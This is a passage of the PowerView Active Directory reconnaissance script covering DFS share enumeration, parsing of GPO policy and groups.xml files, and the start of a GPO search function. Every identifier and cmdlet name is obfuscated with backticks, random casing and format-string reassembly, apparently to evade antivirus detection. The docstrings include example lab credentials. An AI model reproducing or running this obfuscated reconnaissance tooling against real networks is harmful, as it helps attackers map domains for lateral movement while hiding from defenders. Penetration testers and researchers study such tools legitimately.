                            ${S`ErVe`R_Na`Me`_sIze} = [bitconverter]::ToUInt16(${DfS_`Ta`R`g`ETliS`T_BLOB}[${SE`R`V`Er_NAMe_`s`iZe_`sTart}..${s`ERVe`R_nAMe_sI`Ze`_`eND}],0)

                            ${SerV`ER_NA`mE`_staRT} = ${sERvER`_N`Am`E`_`sIZE_End} + 1
                            ${sERVe`R_n`A`Me_e`Nd} = ${SER`Ver_nAM`e_STa`Rt} + ${s`ERvER`_NA`me_s`ize} - 1
                            ${sE`R`VeR_`NamE} = [System.Text.Encoding]::Unicode.GetString(${DfS`_TargET`l`IS`T`_bloB}[${SErver_`NAm`e`_sTaRT}..${S`ERVe`R`_naME_eNd}])

                            ${ShA`Re_N`A`Me_`sIZE_st`A`RT} = ${sERVe`R_N`Ame`_`eNd} + 1
                            ${sHa`RE_`Na`mE_size_End} = ${sh`A`RE_N`A`Me_si`zE_sTART} + 1
                            ${S`HARe_`NamE_s`IZE} = [bitconverter]::ToUInt16(${D`FS_targ`eTLi`st`_BL`ob}[${ShaR`E_`NaME_siZ`E_St`Art}..${shA`R`E`_NAmE_S`i`Z`E_eND}],0)
                            ${SH`ARe_n`AME`_Start} = ${sh`ARe`_NaMe_s`IzE`_end} + 1
                            ${SHARe_n`Am`E`_`EnD} = ${sHA`RE_naMe_`s`TarT} + ${SHAr`E_NamE`_SI`Ze} - 1
                            ${sh`ARE`_`Name} = [System.Text.Encoding]::Unicode.GetString(${DFS_`T`ArGetl`Is`T_bLoB}[${SHa`Re_naM`e_ST`Art}..${sHARe_`NA`ME_ENd}])

                            ${TaRGe`T_L`I`St} += "\\$server_name\$share_name"
                            ${t`_o`FfsET} = ${Sh`ARe_Na`M`e`_END} + 1
                        }
                    }
                }
                ${o`FfseT} = ${blob`_d`A`Ta_e`Nd} + 1
                ${dfs_PK`T_p`R`Op`E`RTiEs} = @{
                    'Name' = ${blOb`_`N`AME}
                    'Prefix' = ${p`R`EFIX}
                    'TargetList' = ${ta`RGe`T_li`St}
                }
                ${OBje`cT`_LIsT} += &("{1}{0}{2}"-f'w','Ne','-Object') -TypeName ("{0}{1}{2}"-f'PS','Ob','ject') -Property ${dFs_P`kt`_PR`O`pE`RTIeS}
                ${PrE`F`Ix} = ${n`Ull}
                ${blo`B_N`A`ME} = ${Nu`lL}
                ${TaRg`eT_`lIST} = ${n`UlL}
            }

            ${Ser`VerS} = @()
            ${OBjec`T_L`I`sT} | &("{1}{2}{3}{0}"-f'ct','Fo','rEach-Obj','e') {
                if (${_}.TargetList) {
                    ${_}.TargetList | &("{3}{1}{0}{2}"-f'h','c','-Object','ForEa') {
                        ${s`er`Vers} += ${_}.split('\')[2]
                    }
                }
            }

            ${SeR`VeRS}
        }

        function GeT`-D`o`maIn`DfSSHARE`V1 {
            [CmdletBinding()]
            Param(
                [String]
                ${D`om`AIN},

                [String]
                ${s`earchBA`SE},

                [String]
                ${SE`RV`er},

                [String]
                ${sEAr`cHS`C`OPE} = 'Subtree',

                [Int]
                ${r`esUltpA`gESI`Ze} = 200,

                [Int]
                ${SErVe`Rt`Im`EL`imit},

                [Switch]
                ${toMB`S`T`ONe},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CRED`En`TIAl} = [Management.Automation.PSCredential]::Empty
            )

            ${Df`SsEa`RC`HEr} = &("{3}{5}{0}{4}{2}{1}" -f'mainS','er','arch','Get-','e','Do') @PSBoundParameters

            if (${DFsSE`ARc`hEr}) {
                ${DF`sS`haReS} = @()
                ${d`FsseaR`CHEr}.filter = '(&(objectClass=fTDfs))'

                try {
                    ${rEsUL`Ts} = ${dFSS`Ear`ChEr}.FindAll()
                    ${RE`Su`ltS} | &("{2}{3}{0}{1}"-f 'ec','t','W','here-Obj') {${_}} | &("{0}{2}{1}{3}" -f'ForE','bj','ach-O','ect') {
                        ${p`Rope`RTi`ES} = ${_}.Properties
                        ${rEMo`TE`NA`mES} = ${p`R`oPErtIES}.remoteservername
                        ${p`KT} = ${Pro`pErt`iES}.pkt

                        ${dF`SS`hAREs} += ${rEmO`Ten`Ames} | &("{4}{1}{2}{0}{3}" -f'ch-Obj','E','a','ect','For') {
                            try {
                                if ( ${_}.Contains('\') ) {
                                    &("{0}{2}{1}"-f'New-Obj','t','ec') -TypeName ("{1}{2}{0}"-f 'ct','PSO','bje') -Property @{'Name'=${p`R`o`PErties}.name[0];'RemoteServerName'=${_}.split('\')[2]}
                                }
                            }
                            catch {
                                &("{2}{0}{1}"-f 'ri','te-Verbose','W') "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if (${ReSu`LtS}) {
                        try { ${r`esULTs}.dispose() }
                        catch {
                            &("{2}{1}{0}{3}"-f'rbos','te-Ve','Wri','e') "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    ${D`Fsse`ArcHer}.dispose()

                    if (${P`KT} -and ${p`KT}[0]) {
                        &("{1}{2}{0}" -f'e-Pkt','P','ars') ${p`kT}[0] | &("{1}{0}{2}{4}{3}" -f 'rE','Fo','ac','ect','h-Obj') {
                            # If a folder doesn't have a redirection it will have a target like
                            # \\null\TestNameSpace\folder\.DFSFolderLink so we do actually want to match
                            # on 'null' rather than $Null
                            if (${_} -ne 'null') {
                                &("{0}{1}{2}"-f'New','-Ob','ject') -TypeName ("{0}{1}{2}"-f'PSOb','je','ct') -Property @{'Name'=${PR`OpeR`TIeS}.name[0];'RemoteServerName'=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{0}{1}{2}{3}" -f 'Writ','e-','W','arning') "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                ${dfS`shar`ES} | &("{3}{1}{2}{0}" -f't','b','jec','Sort-O') -Unique -Property 'RemoteServerName'
            }
        }

        function gEt`-D`OMa`iNdFs`s`ha`Rev2 {
            [CmdletBinding()]
            Param(
                [String]
                ${dO`M`Ain},

                [String]
                ${SE`A`RCHBasE},

                [String]
                ${Se`R`Ver},

                [String]
                ${s`eA`Rc`hScopE} = 'Subtree',

                [Int]
                ${reSULT`P`AgE`S`IZe} = 200,

                [Int]
                ${s`ERVErTImElI`m`iT},

                [Switch]
                ${TomBs`To`Ne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${cre`deN`Ti`AL} = [Management.Automation.PSCredential]::Empty
            )

            ${dF`sSeaRC`H`eR} = &("{1}{3}{4}{2}{0}"-f'nSearcher','G','i','et','-Doma') @PSBoundParameters

            if (${DFSs`E`A`RCHEr}) {
                ${Df`Ss`HA`Res} = @()
                ${D`FsSearCh`Er}.filter = '(&(objectClass=msDFS-Linkv2))'
                ${n`ULL} = ${D`Fs`SeArCher}.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    ${rEs`Ul`TS} = ${d`F`SsEArCHeR}.FindAll()
                    ${R`EsU`LTs} | &("{1}{0}{2}{3}" -f're-','Whe','Obj','ect') {${_}} | &("{3}{0}{1}{2}"-f'ach-Obj','ec','t','ForE') {
                        ${Pr`O`pER`Ties} = ${_}.Properties
                        ${t`ArGeT`_l`IsT} = ${pRoPE`R`TIeS}.'msdfs-targetlistv2'[0]
                        ${x`ml} = [xml][System.Text.Encoding]::Unicode.GetString(${T`Ar`gET_li`St}[2..(${ta`RgET`_li`ST}.Length-1)])
                        ${Df`sS`har`es} += ${X`ML}.targets.ChildNodes | &("{2}{3}{1}{0}"-f'ject','b','ForEach-','O') {
                            try {
                                ${t`AR`get} = ${_}.InnerText
                                if ( ${tAR`G`eT}.Contains('\') ) {
                                    ${DfS`R`OoT} = ${tar`G`ET}.split('\')[3]
                                    ${ShAR`E`Name} = ${p`RoP`ertIES}.'msdfs-linkpathv2'[0]
                                    &("{0}{3}{1}{2}" -f'N','-Obje','ct','ew') -TypeName ("{1}{2}{0}" -f 'ect','PSOb','j') -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=${t`ARget}.split('\')[2]}
                                }
                            }
                            catch {
                                &("{2}{3}{0}{1}"-f 'Ve','rbose','Writ','e-') "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if (${R`e`SULTs}) {
                        try { ${ReS`U`LTS}.dispose() }
                        catch {
                            &("{0}{1}{3}{2}" -f 'Wr','ite','se','-Verbo') "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    ${d`F`SSeA`RChER}.dispose()
                }
                catch {
                    &("{0}{2}{1}"-f'Wr','rning','ite-Wa') "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                ${dF`s`sHareS} | &("{0}{3}{1}{2}" -f'S','t-Obj','ect','or') -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        ${dFsS`HA`ReS} = @()

        if (${p`sBou`NDPA`RAmETERS}['Domain']) {
            ForEach (${TarGE`TdO`MAiN} in ${d`OM`Ain}) {
                ${sea`R`C`HErARgu`m`ENtS}['Domain'] = ${Ta`RG`etdo`main}
                if (${v`ersI`on} -match 'all|1') {
                    ${D`FsSh`AR`eS} += &("{3}{1}{0}{2}{4}"-f 'omain','-D','DFSSha','Get','reV1') @SearcherArguments
                }
                if (${V`ErsioN} -match 'all|2') {
                    ${D`FssHaR`Es} += &("{3}{2}{0}{1}" -f 'FSSh','areV2','ainD','Get-Dom') @SearcherArguments
                }
            }
        }
        else {
            if (${ve`RS`Ion} -match 'all|1') {
                ${df`SshA`REs} += &("{1}{0}{4}{5}{3}{2}"-f 'D','Get-Domain','1','reV','FSSh','a') @SearcherArguments
            }
            if (${vER`S`iON} -match 'all|2') {
                ${Dfss`H`ArES} += &("{0}{2}{3}{4}{1}" -f'Get-Domai','areV2','n','DFS','Sh') @SearcherArguments
            }
        }

        ${d`F`sSHAR`eS} | &("{0}{2}{1}"-f 'S','rt-Object','o') -Property ('RemoteServerName','Name') -Unique
    }
}


########################################################
#
# GPO related functions.
#
########################################################

function G`E`T-gPTT`mpL {
<#
.SYNOPSIS

Helper to parse a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATH\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing | Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = ${t`RUE}, ValueFromPipeline = ${Tr`Ue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${Gp`TTM`plP`AtH},

        [Switch]
        ${OUt`put`ObJEcT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEde`Nt`IAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${MA`PPeD`pa`ThS} = @{}
    }

    PROCESS {
        try {
            if ((${G`pt`T`MpLpAth} -Match '\\\\.*\\.*') -and (${PSB`ou`NdP`Ar`AM`eteRS}['Credential'])) {
                ${SYsvOL`p`A`Th} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not ${MA`P`p`eDpAths}[${sy`SVO`lpAth}]) {
                    # map IPC$ to this computer if it's not already
                    &("{0}{2}{4}{1}{3}{5}" -f 'Add-Remote','ec','Con','ti','n','on') -Path ${sy`SvO`LPa`TH} -Credential ${c`Re`deN`TIal}
                    ${mApP`E`DP`AthS}[${s`Ysv`OL`patH}] = ${t`RUE}
                }
            }

            ${t`ArGETgpt`Tmpl`Pa`TH} = ${GPTtmP`Lpa`TH}
            if (-not ${tARg`eTgpt`TM`PLPaTh}.EndsWith('.inf')) {
                ${tA`RgE`TGp`TtmPlPatH} += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            &("{2}{1}{0}" -f 'ose','rb','Write-Ve') "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if (${p`S`BoUNdp`ARaME`TErS}['OutputObject']) {
                ${conteN`TS} = &("{2}{0}{4}{3}{1}"-f 't-IniCo','t','Ge','n','nte') -Path ${tARG`E`TGpttMpL`P`Ath} -OutputObject -ErrorAction ("{1}{0}" -f'top','S')
                if (${COn`T`eNts}) {
                    ${cO`NT`eNTs} | &("{1}{0}{2}"-f'M','Add-','ember') ("{0}{1}{2}" -f'Not','eproper','ty') 'Path' ${t`Ar`ge`T`gPTTmplpATH}
                    ${Co`NTeNTs}
                }
            }
            else {
                ${c`on`TEnTs} = &("{3}{0}{4}{2}{1}" -f'-','nt','Conte','Get','Ini') -Path ${tARG`eT`GPTtm`pLpAtH} -ErrorAction ("{1}{0}"-f 'top','S')
                if (${ConTe`N`TS}) {
                    ${Co`NTEN`Ts}['Path'] = ${taRGet`G`pttm`plPatH}
                    ${cO`NT`ENts}
                }
            }
        }
        catch {
            &("{0}{3}{2}{1}" -f'W','bose','r','rite-Ve') "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        ${Map`PeD`P`ATHS}.Keys | &("{2}{3}{0}{1}" -f'e','ct','Fo','rEach-Obj') { &("{0}{5}{3}{2}{1}{4}"-f 'Remo','ec','nn','Co','tion','ve-Remote') -Path ${_} }
    }
}


function get`-GrO`U`P`Sxml {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = ${T`RuE}, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('Path')]
        [String]
        ${grOU`PSXMl`pA`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`dEN`TiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${m`APPedpa`THS} = @{}
    }

    PROCESS {
        try {
            if ((${GROUPs`Xm`lpA`TH} -Match '\\\\.*\\.*') -and (${PSb`OuNDpAR`AM`ETers}['Credential'])) {
                ${SY`sV`o`LpAtH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${MaP`peDp`AtHs}[${sYS`VoLp`A`Th}]) {
                    # map IPC$ to this computer if it's not already
                    &("{0}{2}{1}{3}" -f'A','nnect','dd-RemoteCo','ion') -Path ${s`y`SvOLpaTH} -Credential ${credE`NT`I`Al}
                    ${mA`pPedpa`THs}[${sYSvOL`P`ATh}] = ${T`Rue}
                }
            }

            [XML]${gR`OuPSxMl`C`OnT`ent} = &("{0}{1}{2}"-f'Get-C','o','ntent') -Path ${GrOu`p`S`XMlPaTh} -ErrorAction ("{1}{0}" -f 'top','S')

            # process all group properties in the XML
            ${GROUPSX`M`LC`o`NTE`Nt} | &("{1}{2}{0}"-f't-Xml','Sele','c') "/Groups/Group" | &("{0}{2}{1}{3}" -f'Sele','t-Obj','c','ect') -ExpandProperty ("{0}{1}" -f 'no','de') | &("{3}{4}{2}{1}{0}" -f'bject','O','h-','ForE','ac') {

                ${GRoUP`N`Ame} = ${_}.Properties.groupName

                # extract the localgroup sid for memberof
                ${g`R`OupsiD} = ${_}.Properties.groupSid
                if (-not ${gR`oUPs`ID}) {
                    if (${Gro`UpNA`me} -match 'Administrators') {
                        ${g`ROups`Id} = 'S-1-5-32-544'
                    }
                    elseif (${g`ROu`pnaMe} -match 'Remote Desktop') {
                        ${g`R`Oupsid} = 'S-1-5-32-555'
                    }
                    elseif (${Gro`UPnA`me} -match 'Guests') {
                        ${gr`ou`pS`id} = 'S-1-5-32-546'
                    }
                    else {
                        if (${psBO`UN`DPaR`Am`Eters}['Credential']) {
                            ${GROU`PS`id} = &("{2}{1}{3}{4}{0}"-f 'D','n','Co','vertT','o-SI') -ObjectName ${GRo`UpNa`Me} -Credential ${cr`EdenT`Ial}
                        }
                        else {
                            ${G`RO`UPsid} = &("{0}{2}{3}{1}"-f'Conve','SID','r','tTo-') -ObjectName ${g`R`OUPNA`me}
                        }
                    }
                }

                # extract out members added to this group
                ${m`emb`ErS} = ${_}.Properties.members | &("{3}{0}{1}{2}" -f 'elect-Ob','je','ct','S') -ExpandProperty ("{1}{0}" -f 'er','Memb') | &("{0}{1}{2}" -f'Where','-O','bject') { ${_}.action -match 'ADD' } | &("{0}{1}{3}{2}" -f 'ForEach-','O','ct','bje') {
                    if (${_}.sid) { ${_}.sid }
                    else { ${_}.name }
                }

                if (${me`mBErS}) {
                    # extract out any/all filters...I hate you GPP
                    if (${_}.filters) {
                        ${F`IL`Ters} = ${_}.filters.GetEnumerator() | &("{2}{1}{0}"-f'bject','ach-O','ForE') {
                            &("{1}{3}{0}{2}"-f'Obje','Ne','ct','w-') -TypeName ("{2}{0}{1}" -f'ec','t','PSObj') -Property @{'Type' = ${_}.LocalName;'Value' = ${_}.name}
                        }
                    }
                    else {
                        ${FI`l`TeRS} = ${nU`ll}
                    }

                    if (${me`mBe`Rs} -isnot [System.Array]) { ${me`m`BeRs} = @(${MemB`eRS}) }

                    ${grO`UPS`XMl} = &("{2}{1}{0}" -f'ject','w-Ob','Ne') ("{0}{1}{2}"-f'PSO','b','ject')
                    ${g`RoUp`sxmL} | &("{0}{2}{3}{1}"-f 'Add','ber','-M','em') ("{2}{1}{0}"-f 'perty','pro','Note') 'GPOPath' ${TarG`ETgr`o`Ups`Xm`LpAth}
                    ${gr`o`UPS`XMl} | &("{0}{1}{3}{2}"-f 'Ad','d-Me','er','mb') ("{1}{0}{2}"-f'ote','N','property') 'Filters' ${F`iLt`erS}
                    ${G`RoU`Psxml} | &("{2}{0}{1}{3}"-f 'd-Mem','b','Ad','er') ("{1}{2}{0}{3}" -f 'epro','N','ot','perty') 'GroupName' ${GRO`U`pNAmE}
                    ${g`ROU`pSxmL} | &("{0}{2}{1}" -f'Add','Member','-') ("{0}{1}{2}"-f 'Notepro','pert','y') 'GroupSID' ${G`RoupsId}
                    ${gR`OupS`X`ML} | &("{0}{2}{1}"-f 'Add-M','mber','e') ("{0}{3}{2}{1}" -f 'Notepr','rty','e','op') 'GroupMemberOf' ${N`UlL}
                    ${g`RouP`SXml} | &("{0}{1}{2}" -f 'Add','-Membe','r') ("{3}{0}{1}{2}" -f 'p','ropert','y','Note') 'GroupMembers' ${MEm`BeRs}
                    ${gR`ouPS`XmL}.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    ${GR`oUP`Sx`mL}
                }
            }
        }
        catch {
            &("{0}{2}{1}" -f 'Wri','bose','te-Ver') "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        ${MaPP`EDPaT`HS}.Keys | &("{2}{3}{1}{4}{0}" -f 'Object','ch','ForE','a','-') { &("{2}{1}{3}{4}{0}" -f 'n','onn','Remove-RemoteC','ecti','o') -Path ${_} }
    }
}


function Get-do`mai`Ng`PO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | Get-DomainGPO

Return the GPOs with the name of "{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display
name of "Test GPO"

.EXAMPLE

Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPO -Credential $Cred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${iD`eNT`iTy},

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${co`m`p`UteRiDEntity},

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`s`eRID`eN`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`DAP`FIlteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`O`p`eRTies},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEaRC`H`B`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${ser`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`Ea`RCh`SCOpe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsUL`Tp`Ag`EsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRV`ERt`I`MelIMIt},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SeCuRI`TY`MASks},

        [Switch]
        ${t`oMBSTo`Ne},

        [Alias('ReturnOne')]
        [Switch]
        ${f`INdONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`DE`NT`IaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SE`ArCh`ER`AR`GU`menTS} = @{}
        if (${pSBouNd`P`ARA`MeteRs}['Domain']) { ${s`EARChErAR`GUmen`TS}['Domain'] = ${d`OmAin} }
        if (${PS`BO`UnDpA`RA`Mete`Rs}['Properties']) { ${s`E`ArchERAr`GUMENTs}['Properties'] = ${p`RopEr`TiES} }
        if (${PSB`oUnDpAR`A`MEt`erS}['SearchBase']) { ${SeaRchEr`A`RGum`eNts}['SearchBase'] = ${S`Ea`RcHba`Se} }
        if (${p`SBo`UNDpARAmeT`eRS}['Server']) { ${seAr`ch`ERA`R`G`UmeNTs}['Server'] = ${SE`RvER} }
        if (${P`sbou`NDPaRa`Met`ERS}['SearchScope']) { ${sE`A`RChE`RAr`g`UmEntS}['SearchScope'] = ${s`e`ArcHScO`pE} }
        if (${P`SbOUnD`P`ArAm`eTErS}['ResultPageSize']) { ${sE`ArcHEr`Ar`GUmenTs}['ResultPageSize'] = ${re`sultp`Ag`esiZe} }
        if (${ps`B`ou`NDPAra`mEtE`RS}['ServerTimeLimit']) { ${sEARCh`Er`ArgUM`eNtS}['ServerTimeLimit'] = ${ServEr`TI`M`ElIM`iT} }
        if (${PSbO`Und`PArAMeT`erS}['SecurityMasks']) { ${sE`A`RCHeRarGumE`Nts}['SecurityMasks'] = ${sECu`R`ITyMas`kS} }
        if (${Ps`BOUndpaRAm`ET`ErS}['Tombstone']) { ${S`EARCHeraR`guM`ENtS}['Tombstone'] = ${tom`BsTo`Ne} }
        if (${pSbOu`NDP`AramE`TErS}['Credential']) { ${SEar`cH`eRa`Rg`UMENTS}['Credential'] = ${CR`eD`ential} }
        ${gP`O`SeaR`cHer} = &("{1}{0}{3}{2}{4}"-f 'e','G','D','t-','omainSearcher') @SearcherArguments
    }

    PROCESS {
        if (${Gp`os`E`ARCher}) {
            if (${PsbouNd`PAr`Ame`T`ers}['ComputerIdentity'] -or ${p`SbounDpaRAme`TE`Rs}['UserIdentity']) {
                ${gPo`AdSp`AThS} = @()
                if (${SE`A`RcheRA`RGUm`e`NTs}['Properties']) {
                    ${OlDp`RO`p`ErT`iES} = ${s`E`AR`cHERarGuMEntS}['Properties']
                }
                ${sE`ARCHE`RaR`GuM`en`TS}['Properties'] = 'distinguishedname,dnshostname'
                ${tArgEtCO`MPu`TE`Rna`ME} = ${n`ULL}

                if (${PS`B`OUNDPAr`AM`ET`ErS}['ComputerIdentity']) {
                    ${SEa`RcHera`R`g`U`MeNts}['Identity'] = ${co`Mp`UTerID`eNt`ITY}
                    ${co`MPuter} = &("{3}{2}{5}{1}{0}{4}" -f'nC','Domai','et','G','omputer','-') @SearcherArguments -FindOne | &("{2}{0}{1}"-f'elect-Ob','ject','S') -First 1
                    if(-not ${cO`m`Puter}) {
                        &("{3}{2}{1}{0}"-f 'erbose','e-V','it','Wr') "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    ${O`Bj`eCtDN} = ${C`OmP`UTer}.distinguishedname
                    ${tARgE`TCO`mpuTE`RNAMe} = ${C`ompU`T`eR}.dnshostname
                }
                else {
                    ${SEaR`ChEr`A`RGuMenTs}['Identity'] = ${use`Ri`dEntity}
